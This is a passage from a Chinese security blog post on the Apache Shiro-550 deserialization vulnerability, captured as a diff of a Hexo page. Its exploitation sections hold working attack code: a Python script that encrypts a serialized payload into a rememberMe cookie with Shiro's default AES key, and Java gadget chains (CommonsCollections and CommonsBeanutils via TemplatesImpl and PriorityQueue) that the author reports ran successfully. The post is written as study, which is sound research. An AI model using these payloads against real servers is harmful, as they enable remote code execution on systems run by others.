BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(f.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme()    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br></pre></td></tr></table></figure>
+
+<p>然后打就完了：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711105808591.png" alt="1711105808591" style="zoom:50%;">
+
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711099895450.png" alt="1711099895450" style="zoom: 50%;">
+
+<p>成功</p>
+<h4 id="3-2-CC链"><a href="#3-2-CC链" class="headerlink" title="3.2 CC链"></a>3.2 CC链</h4><p>如果是按照上述环境搭建的流程来的话，因为shiro本身是不带CC依赖的，所以到这一步需要加一个CC依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>之后呢，如果我们正常拿CC链来打的话是打不通的（tomcat的类加载器里边不支持数组类的加载），当然，如果你的CC依赖是CC4的话，是可以直接拿CC2来打的，我们这里用的是CC3的依赖，CC2打不了，就需要构造自己的链子来把Transformer数组给去掉，我在这里学的是白日梦组长的链子，思路相当于之前学过的CC3、CC6、CC2的集合，忘记了的话可以去看一下前面的知识：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">nameField.set(templates,<span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesField.set(templates,codes);</span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; innerMap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(innerMap, templates);</span><br><span class="line">HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">innerMap.remove(templates);</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">factoryField.set(innerMap,invokerTransformer);</span><br><span class="line"><span class="comment">//序列化</span></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;C:\\Users\\Narcher\\IdeaProjects\\shiro_CC.txt&quot;</span>));</span><br><span class="line">oos.writeObject(hashMap);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_rememberme</span>():</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;shiro_CC.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(f.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme()    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br></pre></td></tr></table></figure>
+
+<p>是能够打的通的：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711109384042.png" alt="1711109384042" style="zoom: 50%;">
+
+<h4 id="3-3-CB链"><a href="#3-3-CB链" class="headerlink" title="3.3 CB链"></a>3.3 CB链</h4><p>上边也说了，shiro原生是不带CC依赖的，所以打原生就要用到CB了，如果是按上述流程搭建的环境，那么shiro自带的CB是1.8.3版本的，我们接下来看看链子应该怎么构造：</p>
+<p>首先，CB链最后的命令执行流程还是和CC3是一样的，因为利用的是Java的反射机制和动态类加载的特性，我们先把前边的拿过来：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">nameField.set(templates,<span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesField.set(templates,codes);</span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br></pre></td></tr></table></figure>
+
+<p>按原先CC3的步骤，我们是直接利用TrAXfilter类进行templates的newTransformer方法的触发，但这里我们CB依赖里是没有这个类的，因此我们就要从TemplatesImpl类中找一下能命令执行的点，实际上这里用的就是CB中的PropertyUtils.getProperty方法，它能够获取类的实例化对象中的JavaBean格式的方法，而TemplatesImpl类中恰好有符合JavaBean格式，且能够利用的方法：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711199986851.png" alt="1711199986851" style="zoom: 67%;">
+
+<p>而PropertyUtils类是没有继承序列化接口的，我们需要在CB依赖中找到一个调用PropertyUtils.getProperty方法的类且继承了序列化接口，这里我们使用BeanComparator类，其中有着compare方法：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711200210269.png" alt="1711200210269" style="zoom: 67%;">
+
+<p>这部分的链子应该这样写：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>, <span class="keyword">new</span> <span class="title class_">AttrCompare</span>());</span><br></pre></td></tr></table></figure>
+
+<p>至于为什么要传AttrCompare类的实例，可以看一下BeanComparator构造器的源码：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711201185415.png" alt="1711201185415" style="zoom:67%;">
+
+<p>其中的ComparableComparator类来自于CC依赖，在shiro原生中是没有的，所以我们就用了一个即在CB依赖中有，又继承了序列化接口的类。</p>
+<p>接下来寻找调用compare方法的类，是不是很熟悉了？</p>
+<p>没错，在之前的CC4链的学习中，我们就用了compare方法来触发ChainedTransformer的transform方法，那么我们去再看一看那个compare方法：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711200539928.png" alt="1711200539928" style="zoom:67%;">
+
+<p>可见其不仅调用了transform方法，还调用了compare方法，我们只需要把decorated传成我们构造好的BeanComparator类的实例就好了，只需要把CC4中传入priorityQueue的transformingComparator改成beanComparator就好了，接下来的流程就和CC4后边一样了，我们直接拿过来：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">nameField.set(templates,<span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesField.set(templates,codes);</span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>, <span class="keyword">new</span> <span class="title class_">AttrCompare</span>());</span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">priorityQueue.add(templates);</span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">Class&lt;PriorityQueue&gt; c = PriorityQueue.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">comparatorField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">comparatorField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">comparatorField.set(priorityQueue,beanComparator);</span><br><span class="line"><span class="comment">//序列化</span></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;C:\\Users\\Narcher\\IdeaProjects\\shiro_CB.txt&quot;</span>));</span><br><span class="line">oos.writeObject(priorityQueue);</span><br></pre></td></tr></table></figure>
+
+<p>最后打一下看看：</p>
+<img src="/2024/12/22/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711201791201.png" alt="1711201791201" style="zoom:67%;">
+
+<p>成功执行</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/12/22/JAVA%E5%AE%89%E5%85%A8CC7%E9%93%BE/" rel="prev" title="JAVA安全:CC7链">
+      <i class="fa fa-chevron-left"></i> JAVA安全:CC7链
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A3%E6%96%87"><span class="nav-number">2.</span> <span class="nav-text">正文</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.1.</span> <span class="nav-text">1.环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E8%B0%83%E8%AF%95"><span class="nav-number">2.2.</span> <span class="nav-text">2.调试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90"><span class="nav-number">2.2.1.</span> <span class="nav-text">2.1 加密分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90"><span class="nav-number">2.2.2.</span> <span class="nav-text">2.2 解密分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.3.</span> <span class="nav-text">3.漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-URLDNS%E9%93%BE"><span class="nav-number">2.3.1.</span> <span class="nav-text">3.1 URLDNS链</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-CC%E9%93%BE"><span class="nav-number">2.3.2.</span> <span class="nav-text">3.2 CC链</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-3-CB%E9%93%BE"><span class="nav-number">2.3.3.</span> <span class="nav-text">3.3 CB链</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Narcher Alter</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Narcher Alter</span>
+</div>
+<!--
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+-->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
